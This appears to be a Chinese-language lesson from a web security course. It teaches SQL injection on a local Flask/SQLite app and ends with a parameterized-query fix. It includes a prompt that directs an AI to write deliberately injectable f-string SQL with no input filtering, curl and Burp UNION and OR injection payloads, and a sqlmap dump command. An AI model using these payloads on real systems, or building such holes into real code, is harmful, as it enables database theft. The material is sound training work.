# Day 3 - SQL 注入漏洞

---

## 一、发给 Claude 的提示词

把以下内容完整复制粘贴到 claude.ai 对话框中：

```
请在上次已生成的登录功能基础上，继续增加用户注册和搜索功能。保持原有登录功能不变。

### 在 app.py 中新增以下内容：

1. 在文件开头新增导入：import sqlite3, os
2. 新增一个初始化数据库的函数 init_db()，在启动时调用：
   - 数据库文件保存在 data/ 目录下，文件名为 users.db
   - 创建 users 表，包含字段：id (自增主键)、username (唯一)、password、email、phone
   - 插入默认用户：admin/admin123、alice/alice2025
   - 使用 INSERT OR IGNORE 防止重复插入

3. 新增注册路由 /register，支持 GET 和 POST：
   - 显示注册页面 register.html，包含用户名、密码、邮箱、手机号输入框
   - POST 提交时将数据用字符串拼接方式插入到 SQLite 数据库中
   - 注册成功后跳转到登录页并提示"注册成功，请登录"
   - 注意：SQL 语句必须使用 f-string 字符串拼接，不要用参数化查询或 ORM

4. 新增搜索路由 /search，支持 GET：
   - 通过 URL 参数 keyword 接收关键词
   - 使用字符串拼接方式拼接 SQL 查询：
     SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'
   - 搜索结果显示在首页，以表格形式展示：ID、用户名、邮箱、手机
   - 注意：SQL 语句必须使用 f-string 字符串拼接，不要用参数化查询
   - 在后台打印执行的 SQL 语句到控制台，方便调试

### 新增 templates/register.html

注册页面，继承 base.html，包含用户名、密码、邮箱、手机号输入框和注册按钮。

### 修改 templates/index.html

在首页已登录状态下添加搜索功能：
- 搜索输入框和搜索按钮
- 搜索结果以表格形式显示在搜索框下方
- 如果有关键词但没有结果，显示"无搜索结果"

### 修改 templates/base.html

在导航栏未登录状态下添加"注册"链接。

### 代码规范要求
- 注册和搜索的 SQL 查询必须使用 f-string 字符串拼接，不能使用参数化查询
- 不要对用户输入做任何过滤或转义
- 搜索功能要打印 SQL 到控制台方便观察注入效果
- 保持原有登录功能不变

生成全部代码后告诉我，我复制覆盖到本地项目。
```

---

## 二、学生操作步骤

| 步骤 | 操作 | 说明 |
|------|------|------|
| 1 | 复制上面提示词发给 Claude | 在已有登录功能基础上增加注册和搜索 |
| 2 | Claude 生成后，覆盖 app.py 和 templates | 保持原有登录功能不变 |
| 3 | 终端运行 `python app.py` | 启动项目 |
| 4 | 浏览器访问 http://127.0.0.1:5000 | 测试注册和搜索 |
| 5 | 用 curl 验证 SQL 注入漏洞 | 见下方 POC |
| 6 | 分析代码，编写修复到 fix/database_fix.py | 修复漏洞 |
| 7 | `git add -A && git commit -m "day-03: 注册搜索 + SQL注入修复"` | 提交成果 |

---

## 三、漏洞原理

### 漏洞 1：字符串拼接 SQL 查询

注册和搜索功能中，用户输入直接拼接到 SQL 语句中：

```python
# 注册 - 字符串拼接
query = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"

# 搜索 - 字符串拼接
query = f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
```

**危害**：用户输入中的特殊字符（如单引号 `'`）会改变 SQL 语句的结构，导致任意 SQL 命令执行。

### 漏洞 2：无任何输入过滤

所有用户输入直接传入 SQL 语句，没有做任何转义或过滤。

### 漏洞 3：搜索结果有回显

搜索结果直接以表格形式展示在页面上，攻击者可以通过 UNION 注入获取任意数据。

---

## 四、POC 代码

### POC 1：UNION 注入获取任意数据

```bash
# 先登录获取 session
curl http://127.0.0.1:5000/login -d "username=admin&password=admin123" -c /tmp/cookies.txt

# UNION 注入：向搜索结果的表中插入自定义数据
curl "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj@x.com%27,%27138%27--" -b /tmp/cookies.txt | grep "inj"
```

**预期输出**：搜索结果中出现 "inj" 用户名。

### POC 2：OR 注入搜索全部用户

```bash
# OR 注入：让 WHERE 条件永远为真，返回所有用户
curl "http://127.0.0.1:5000/search?keyword=%27%20OR%20%271%27%3D%271" -b /tmp/cookies.txt
```

**预期输出**：显示数据库中所有用户，包括 admin、alice 和其他注册用户。

### POC 3：注册功能 SQL 注入

```bash
# 注册时注入 SQL，在用户名中插入特殊字符
curl http://127.0.0.1:5000/register -d "username=hacker', 'pass', 'h@x.com', '123')--&password=irrelevant"
```

---

## 五、Burp Suite 测试方法

1. 登录后拦截 GET /search?keyword=admin 请求
2. 发送到 Repeater
3. 修改 keyword 参数测试：
   - `admin' OR '1'='1` → 应返回所有用户
   - `' UNION SELECT 1,2,3,4--` → 应返回数字代替数据
   - `' UNION SELECT 1,username,email,phone FROM users--` → 应返回所有用户名和邮箱
4. 观察响应变化，确认注入生效

---

## 六、POC 代码详细解释

### POC 1 详解：UNION 注入

```
原 SQL：SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'

输入 keyword = ' UNION SELECT 1,'inj','inj@x.com','138'--

生成 SQL：
SELECT * FROM users
WHERE username LIKE '%' UNION SELECT 1,'inj','inj@x.com','138'--%'
      ^^^^^^^^
      UNION 合并第二个查询的结果

第二个查询返回：1, inj, inj@x.com, 138
这些数据会出现在原始的搜索结果中
```

**为什么列数必须是 4？**

```
SELECT * FROM users  返回 4 列（id, username, email, phone）
UNION SELECT 1,'inj','inj@x.com','138'  也必须返回 4 列

如果列数不匹配，SQLite 会报错：
"SELECTs to the left and right of UNION do not have the same number of result columns"
```

### POC 2 详解：OR 万能条件

```
原 SQL：SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'

输入 keyword = ' OR '1'='1

生成 SQL：
SELECT * FROM users
WHERE username LIKE '%' OR '1'='1%' OR email LIKE '%' OR '1'='1%'
                       ^^^^^^^^^^^
                       永真条件，所有行都匹配

结果：返回 users 表中的全部数据
```

---

## 七、修复方案

创建 `fix/database_fix.py`：

```python
import sqlite3

def add_user_fixed(username, password, email, phone):
    """使用参数化查询修复 SQL 注入"""
    conn = sqlite3.connect("data/users.db")
    cursor = conn.cursor()
    # 修复：使用 ? 占位符替代字符串拼接
    query = "INSERT INTO users (username, password, email, phone) VALUES (?, ?, ?, ?)"
    cursor.execute(query, (username, password, email, phone))
    conn.commit()
    conn.close()

def search_users_fixed(keyword):
    """参数化 LIKE 查询"""
    conn = sqlite3.connect("data/users.db")
    cursor = conn.cursor()
    # 修复：keyword 作为参数传入
    query = "SELECT * FROM users WHERE username LIKE ? OR email LIKE ?"
    cursor.execute(query, (f'%{keyword}%', f'%{keyword}%'))
    results = cursor.fetchall()
    conn.close()
    return results
```

然后在 app.py 中将注册和搜索路由改为使用修复版本。

---

## 八、漏洞复现检查清单

| # | 检查项 | curl 命令 | 预期结果 |
|---|--------|----------|---------|
| 1 | UNION 注入 | `?...keyword=%27 UNION SELECT 1,2,3,4--` | 出现数字 2、3、4 |
| 2 | OR 万能搜索 | `?...keyword=%27 OR '1'='1` | 显示全部用户 |
| 3 | SQL 语句打印 | 查看控制台 | 显示拼接后的 SQL |
| 4 | 数据泄露 | UNION 注入提取数据 | 获取其他用户信息 |

---

## 九、课后任务

1. 确定当前 users 表的列数（用 ORDER BY 或不断尝试 UNION）
2. 用 UNION 注入从数据库中提取密码字段
3. 在 fix/ 目录下编写参数化查询修复代码
4. 验证修复后注入无法复现
5. 尝试用 sqlmap 自动化注入：`sqlmap -u "http://127.0.0.1:5000/search?keyword=admin" --cookie="session=xxx" --batch --dump`
6. 提交到自己的个人分支
